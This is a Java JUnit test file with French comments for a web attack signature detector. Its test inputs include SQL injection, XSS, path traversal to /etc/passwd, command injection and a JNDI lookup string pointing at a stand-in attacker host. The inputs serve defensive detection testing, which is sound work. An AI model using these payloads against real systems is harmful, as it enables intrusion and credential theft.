package sn.ept.transdic1.threat.service;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import sn.ept.transdic1.threat.service.WebAttackSignatures.Family;

/**
 * Signatures d'attaques web : ce qui doit être reconnu, ce qui ne doit surtout pas l'être, et le
 * score cumulé qui tranche.
 */
class WebAttackSignaturesTests {
  @ParameterizedTest
  @ValueSource(
      strings = {
        "/produits?id=1 UNION SELECT mot_de_passe FROM utilisateurs",
        "/connexion?user=admin' OR 1=1 --",
        "/recherche?q=1;DROP TABLE etudiants",
        "/page?id=1 AND sleep(5)",
        "/api?t=select * from information_schema.tables"
      })
  void uneInjectionSqlEstReconnue(String request) {
    var verdict = WebAttackSignatures.examine(request);

    assertThat(verdict.isAttack()).isTrue();
    assertThat(verdict.families()).contains(Family.INJECTION_SQL);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/recherche?q=<script>alert(1)</script>",
        "/page?retour=javascript:alert(document.cookie)",
        "/profil?nom=<img src=x onerror=alert(1)>",
        "/commentaire?texte=<svg onload=alert(1)>"
      })
  void unScriptInjecteEstReconnu(String request) {
    var verdict = WebAttackSignatures.examine(request);

    assertThat(verdict.isAttack()).isTrue();
    assertThat(verdict.families()).contains(Family.XSS);
  }

  @Test
  void uneTraverseeDeRepertoireEstReconnueMemeEncodee() {
    assertThat(WebAttackSignatures.examine("/fichier?f=../../../etc/passwd").isAttack()).isTrue();
    // Encodage simple puis double : les outils d'attaque font les deux.
    assertThat(WebAttackSignatures.examine("/fichier?f=%2e%2e%2f%2e%2e%2fetc/passwd").isAttack())
        .isTrue();
    assertThat(WebAttackSignatures.examine("/fichier?f=%252e%252e%252f%252e%252e%252f").isAttack())
        .isTrue();
  }

  @Test
  void uneExecutionDeCommandeEtUneInjectionDeModeleSontReconnues() {
    assertThat(WebAttackSignatures.examine("/outil?host=127.0.0.1;cat /etc/passwd").families())
        .contains(Family.EXECUTION_COMMANDE);
    assertThat(WebAttackSignatures.examine("/api?x=${jndi:ldap://attaquant.test/a}").families())
        .contains(Family.INJECTION_MODELE);
  }

  @Test
  void laReconnaissanceSeuleNeSuffitPasMaisSaccumule() {
    // Un seul sondage : suspect, pas une attaque. C'est le compte par adresse qui le dira.
    var single = WebAttackSignatures.examine("/wp-login.php");
    assertThat(single.score()).isEqualTo(2);
    assertThat(single.isAttack()).isFalse();

    // Trois indices faibles sur la même requête : le total passe le seuil.
    var several = WebAttackSignatures.examine("/phpmyadmin/.env?f=sauvegarde.sql");
    assertThat(several.score()).isGreaterThanOrEqualTo(WebAttackSignatures.ATTACK_SCORE);
    assertThat(several.isAttack()).isTrue();
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/",
        "/tableau-de-bord",
        "/api/v1/equipements?page=0&size=20",
        "/cours/reseaux/td3.pdf",
        "/etudiants?nom=Diop&prenom=Awa",
        "/recherche?q=select%20un%20cours",
        "/bibliotheque/ouvrage?titre=Les%20bases%20de%20donnees",
        "/images/logo-ept.png"
      })
  void uneRequeteOrdinaireNeDeclencheRien(String request) {
    var verdict = WebAttackSignatures.examine(request);

    assertThat(verdict.isAttack()).isFalse();
    assertThat(verdict.score()).isLessThan(WebAttackSignatures.ATTACK_SCORE);
  }

  @Test
  void uneFamilleNApparaitQuUneFoisMaisChaqueSignatureCompte() {
    // Deux signatures d'injection SQL : le score s'additionne, la famille n'est citée qu'une fois.
    var verdict =
        WebAttackSignatures.examine("/p?id=1 UNION SELECT 1 FROM information_schema.tables");

    assertThat(verdict.families()).containsExactly(Family.INJECTION_SQL);
    assertThat(verdict.score()).isEqualTo(10);
  }

  @Test
  void leResumeDitCeQuiAEteReconnu() {
    var verdict = WebAttackSignatures.examine("/p?id=1' OR 1=1--&x=<script>alert(1)</script>");

    assertThat(verdict.families()).containsExactlyInAnyOrder(Family.INJECTION_SQL, Family.XSS);
    assertThat(verdict.summary()).contains("Injection SQL").contains("Script injecté");
    assertThat(verdict.score()).isGreaterThanOrEqualTo(10);
  }

  @Test
  void uneRequeteVideOuDemesureeNeFaitPasEchouerLAnalyse() {
    assertThat(WebAttackSignatures.examine(null).score()).isZero();
    assertThat(WebAttackSignatures.examine("").score()).isZero();
    assertThat(WebAttackSignatures.examine("   ").families()).isEmpty();

    // Requête très longue : tronquée, et l'analyse rend quand même un verdict.
    String huge = "/p?q=" + "a".repeat(50_000) + "&x=<script>";
    assertThat(WebAttackSignatures.examine(huge)).isNotNull();
    assertThat(WebAttackSignatures.normalize(huge))
        .hasSizeLessThanOrEqualTo(WebAttackSignatures.MAX_LENGTH);
  }

  @Test
  void unEncodageInvalideNeFaitPasEchouerLAnalyse() {
    // « %zz » n'est pas un encodage valide : l'analyse continue sur la valeur brute.
    assertThat(WebAttackSignatures.examine("/p?q=%zz<script>").families())
        .isEqualTo(List.of(Family.XSS));
  }
}
